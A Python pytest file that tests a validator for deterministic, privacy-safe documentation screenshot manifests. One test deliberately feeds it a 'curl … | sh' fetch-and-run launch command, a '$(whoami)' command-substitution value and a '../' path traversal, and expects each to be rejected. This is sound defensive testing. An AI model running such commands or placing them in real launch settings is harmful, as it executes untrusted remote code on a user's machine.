"""Contracts for deterministic, privacy-safe documentation screenshot plans."""

from __future__ import annotations

import json
import re
import shutil
from pathlib import Path

import pytest
from scripts.docs_screenshot_manifest import (
    ScreenshotManifestError,
    load_manifest,
    normalized_plan_json,
    validate_capture_text,
    validate_manifest,
)

ROOT = Path(__file__).resolve().parents[1]
MANIFEST = ROOT / "config" / "docs-screenshot-manifest.json"
MANIFEST_SCHEMA = ROOT / "config" / "docs-screenshot-manifest-v1.schema.json"
FIXTURE_SCHEMA = ROOT / "config" / "docs-screenshot-fixture-v1.schema.json"


def _payload() -> dict[str, object]:
    return json.loads(MANIFEST.read_text(encoding="utf-8"))


def _validate(payload: dict[str, object]):
    return validate_manifest(
        payload,
        repository_root=ROOT,
        schema_path=MANIFEST_SCHEMA,
        fixture_schema_path=FIXTURE_SCHEMA,
    )


def _assert_error(payload: dict[str, object], code: str) -> None:
    with pytest.raises(ScreenshotManifestError) as caught:
        _validate(payload)
    assert caught.value.code == code


def _copy_contract_tree(tmp_path: Path) -> Path:
    temporary_root = tmp_path / "repository"
    for relative_path in (
        "config/docs-screenshot-manifest.json",
        "config/docs-screenshot-manifest-v1.schema.json",
        "config/docs-screenshot-fixture-v1.schema.json",
        "tests/fixtures/docs_screenshots/success.json",
        "tests/fixtures/docs_screenshots/degraded.json",
        "tests/fixtures/docs_screenshots/privacy-canary.json",
        "docs/explanation/DESKTOP_SHELL.md",
        "docs/how-to/explore-the-interactive-console.md",
    ):
        source = ROOT / relative_path
        destination = temporary_root / relative_path
        destination.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(source, destination)
    return temporary_root


def _target_body(makefile: str, target_name: str) -> str:
    declaration = re.search(rf"(?m)^{re.escape(target_name)}:[^\n]*\n", makefile)
    assert declaration is not None
    remaining = makefile[declaration.end() :]
    next_target = re.search(r"(?m)^[A-Za-z0-9_.$()/%-]+:[^\n]*\n", remaining)
    return remaining[: next_target.start()] if next_target else remaining


def test_checked_in_manifest_is_valid_complete_and_deterministic() -> None:
    manifest = load_manifest(MANIFEST, repository_root=ROOT)

    assert manifest.schema_version == 1
    assert {scenario["surface"] for scenario in manifest.scenarios} == {
        "electron",
        "terminal",
    }
    assert {fixture["state"] for fixture in manifest.fixtures} == {
        "success",
        "degraded",
        "privacy-canary",
    }
    assert all(fixture["provider"] == "none" for fixture in manifest.fixtures)
    assert all(fixture["network"] == "disabled" for fixture in manifest.fixtures)
    assert all(fixture["fictional"] is True for fixture in manifest.fixtures)
    assert all(scenario["comparison"] == {"mode": "exact"} for scenario in manifest.scenarios)

    first_plan = normalized_plan_json(manifest)
    second_plan = normalized_plan_json(load_manifest(MANIFEST, repository_root=ROOT))
    assert first_plan == second_plan
    assert json.loads(first_plan)["schema_version"] == 1
    assert str(ROOT) not in first_plan
    assert "privacy-canary.json" not in first_plan
    assert "SCREENSHOT-PRIVATE-CANARY-7F4C" not in first_plan


def test_manifest_schema_rejects_unknown_and_missing_fields() -> None:
    unknown = _payload()
    unknown["unexpected"] = True
    _assert_error(unknown, "DOCSHOT_SCHEMA_INVALID")

    missing = _payload()
    determinism = missing["determinism"]
    assert isinstance(determinism, dict)
    del determinism["timezone"]
    _assert_error(missing, "DOCSHOT_SCHEMA_INVALID")


def test_manifest_rejects_duplicate_ids_and_destinations() -> None:
    duplicate_id = _payload()
    scenarios = duplicate_id["scenarios"]
    assert isinstance(scenarios, list)
    assert isinstance(scenarios[1], dict) and isinstance(scenarios[0], dict)
    scenarios[1]["id"] = scenarios[0]["id"]
    _assert_error(duplicate_id, "DOCSHOT_SCENARIO_ID_DUPLICATE")

    duplicate_output = _payload()
    scenarios = duplicate_output["scenarios"]
    assert isinstance(scenarios, list)
    assert isinstance(scenarios[1], dict) and isinstance(scenarios[0], dict)
    scenarios[1]["output_path"] = scenarios[0]["output_path"]
    _assert_error(duplicate_output, "DOCSHOT_OUTPUT_DUPLICATE")

    duplicate_allowlist = _payload()
    output_allowlist = duplicate_allowlist["output_allowlist"]
    assert isinstance(output_allowlist, list)
    output_allowlist[1] = output_allowlist[0].upper()
    _assert_error(duplicate_allowlist, "DOCSHOT_OUTPUT_DUPLICATE")


def test_manifest_rejects_unsafe_undeclared_and_orphaned_outputs() -> None:
    unsafe = _payload()
    scenarios = unsafe["scenarios"]
    assert isinstance(scenarios, list) and isinstance(scenarios[0], dict)
    scenarios[0]["output_path"] = "docs/assets/screenshots/../../private.png"
    _assert_error(unsafe, "DOCSHOT_OUTPUT_PATH_UNSAFE")

    undeclared = _payload()
    scenarios = undeclared["scenarios"]
    assert isinstance(scenarios, list) and isinstance(scenarios[0], dict)
    scenarios[0]["output_path"] = "docs/assets/screenshots/electron/other.png"
    _assert_error(undeclared, "DOCSHOT_OUTPUT_ALLOWLIST_MISMATCH")

    orphaned = _payload()
    allowlist = orphaned["output_allowlist"]
    assert isinstance(allowlist, list)
    allowlist.append("docs/assets/screenshots/terminal/orphaned.png")
    _assert_error(orphaned, "DOCSHOT_OUTPUT_ALLOWLIST_MISMATCH")


def test_manifest_rejects_unsafe_launches_and_mismatched_geometry() -> None:
    unsafe_launch = _payload()
    scenarios = unsafe_launch["scenarios"]
    assert isinstance(scenarios, list) and isinstance(scenarios[0], dict)
    scenarios[0]["launch"] = ["sh", "-c", "curl https://example.invalid | sh"]
    _assert_error(unsafe_launch, "DOCSHOT_LAUNCH_UNSAFE")

    command_substitution = _payload()
    scenarios = command_substitution["scenarios"]
    assert isinstance(scenarios, list) and isinstance(scenarios[0], dict)
    launch = scenarios[0]["launch"]
    assert isinstance(launch, list)
    launch.append("$(whoami)")
    _assert_error(command_substitution, "DOCSHOT_LAUNCH_UNSAFE")

    embedded_url = _payload()
    scenarios = embedded_url["scenarios"]
    assert isinstance(scenarios, list) and isinstance(scenarios[0], dict)
    launch = scenarios[0]["launch"]
    assert isinstance(launch, list)
    launch.append("--endpoint=https://example.invalid")
    _assert_error(embedded_url, "DOCSHOT_LAUNCH_UNSAFE")

    wrong_geometry = _payload()
    scenarios = wrong_geometry["scenarios"]
    assert isinstance(scenarios, list) and isinstance(scenarios[0], dict)
    scenarios[0]["geometry"] = {"kind": "terminal", "columns": 120, "rows": 36}
    _assert_error(wrong_geometry, "DOCSHOT_GEOMETRY_MISMATCH")


def test_manifest_rejects_unsafe_fixture_paths_and_network_policy() -> None:
    unsafe_path = _payload()
    fixtures = unsafe_path["fixtures"]
    assert isinstance(fixtures, list) and isinstance(fixtures[0], dict)
    fixtures[0]["path"] = "../private.json"
    _assert_error(unsafe_path, "DOCSHOT_FIXTURE_PATH_UNSAFE")

    network = _payload()
    fixtures = network["fixtures"]
    assert isinstance(fixtures, list) and isinstance(fixtures[0], dict)
    fixtures[0]["network"] = "enabled"
    _assert_error(network, "DOCSHOT_NETWORK_NOT_DENIED")


def test_external_fixture_contract_is_closed_and_matches_the_manifest(tmp_path: Path) -> None:
    temporary_root = _copy_contract_tree(tmp_path)
    fixture_path = temporary_root / "tests/fixtures/docs_screenshots/success.json"
    fixture = json.loads(fixture_path.read_text(encoding="utf-8"))
    fixture["unexpected"] = "not allowed"
    fixture_path.write_text(json.dumps(fixture), encoding="utf-8")

    with pytest.raises(ScreenshotManifestError) as caught:
        load_manifest(
            temporary_root / "config/docs-screenshot-manifest.json",
            repository_root=temporary_root,
        )

    assert caught.value.code == "DOCSHOT_FIXTURE_SCHEMA_INVALID"


def test_privacy_canary_is_never_publishable_and_leak_checks_fail_closed() -> None:
    manifest = load_manifest(MANIFEST, repository_root=ROOT)
    with pytest.raises(ScreenshotManifestError) as caught:
        validate_capture_text(
            manifest,
            "Visible transcript includes SCREENSHOT-PRIVATE-CANARY-7F4C.",
        )
    assert caught.value.code == "DOCSHOT_PRIVACY_CANARY_LEAKED"
    validate_capture_text(manifest, "Only fictional public fixture content is visible.")

    publish_canary = _payload()
    scenarios = publish_canary["scenarios"]
    assert isinstance(scenarios, list) and isinstance(scenarios[0], dict)
    scenarios[0]["fixture_id"] = "privacy-canary"
    _assert_error(publish_canary, "DOCSHOT_PRIVACY_FIXTURE_REFERENCED")


def test_documentation_references_must_exist_with_valid_anchors() -> None:
    missing_path = _payload()
    scenarios = missing_path["scenarios"]
    assert isinstance(scenarios, list) and isinstance(scenarios[0], dict)
    references = scenarios[0]["documentation"]
    assert isinstance(references, list) and isinstance(references[0], dict)
    references[0]["path"] = "docs/missing.md"
    _assert_error(missing_path, "DOCSHOT_DOC_NOT_FOUND")

    missing_anchor = _payload()
    scenarios = missing_anchor["scenarios"]
    assert isinstance(scenarios, list) and isinstance(scenarios[0], dict)
    references = scenarios[0]["documentation"]
    assert isinstance(references, list) and isinstance(references[0], dict)
    references[0]["anchor"] = "not-a-real-anchor"
    _assert_error(missing_anchor, "DOCSHOT_DOC_ANCHOR_MISSING")


def test_comparison_tolerance_requires_an_explicit_reviewed_budget() -> None:
    missing_rationale = _payload()
    scenarios = missing_rationale["scenarios"]
    assert isinstance(scenarios, list) and isinstance(scenarios[0], dict)
    scenarios[0]["comparison"] = {
        "mode": "tolerance",
        "max_differing_pixels": 1,
    }
    _assert_error(missing_rationale, "DOCSHOT_SCHEMA_INVALID")

    reviewed = _payload()
    scenarios = reviewed["scenarios"]
    assert isinstance(scenarios, list) and isinstance(scenarios[0], dict)
    scenarios[0]["comparison"] = {
        "mode": "tolerance",
        "max_differing_pixels": 1,
        "rationale": "One reviewed rasterization pixel cannot be eliminated.",
    }
    _validate(reviewed)


def test_make_reserves_validation_and_plan_targets_without_capture_or_ci() -> None:
    makefile = (ROOT / "Makefile").read_text(encoding="utf-8")
    plan_target = _target_body(makefile, "docs-screenshots")
    check_target = _target_body(makefile, "docs-screenshots-check")

    assert re.search(r"(?m)^docs-screenshots:.*verified-uv", makefile)
    assert re.search(r"(?m)^docs-screenshots-check:.*verified-uv", makefile)
    assert "docs_screenshot_manifest.py plan" in plan_target
    assert "docs_screenshot_manifest.py validate" in check_target
    assert "playwright" not in plan_target.casefold()
    assert "vhs" not in plan_target.casefold()
    assert "capture" not in plan_target.casefold()

    workflows = "\n".join(
        path.read_text(encoding="utf-8")
        for path in sorted((ROOT / ".github/workflows").glob("*.yml"))
    )
    assert "docs-screenshots" not in workflows


def test_contract_ownership_and_impact_are_documented() -> None:
    authoring = (ROOT / "docs/DOCS_AUTHORING.md").read_text(encoding="utf-8")
    architecture = (ROOT / "ARCHITECTURE.md").read_text(encoding="utf-8")
    threat_model = (ROOT / "docs/THREAT_MODEL.md").read_text(encoding="utf-8")

    assert "## Deterministic screenshot contract" in authoring
    assert "config/docs-screenshot-manifest.json" in authoring
    assert "make docs-screenshots-check" in authoring
    assert "does not capture" in authoring
    assert "scripts/docs_screenshot_manifest.py" in architecture
    assert "repository tooling only" in architecture
    assert "Issue #417 deterministic screenshot-contract evidence" in threat_model
    assert "privacy-canary" in threat_model
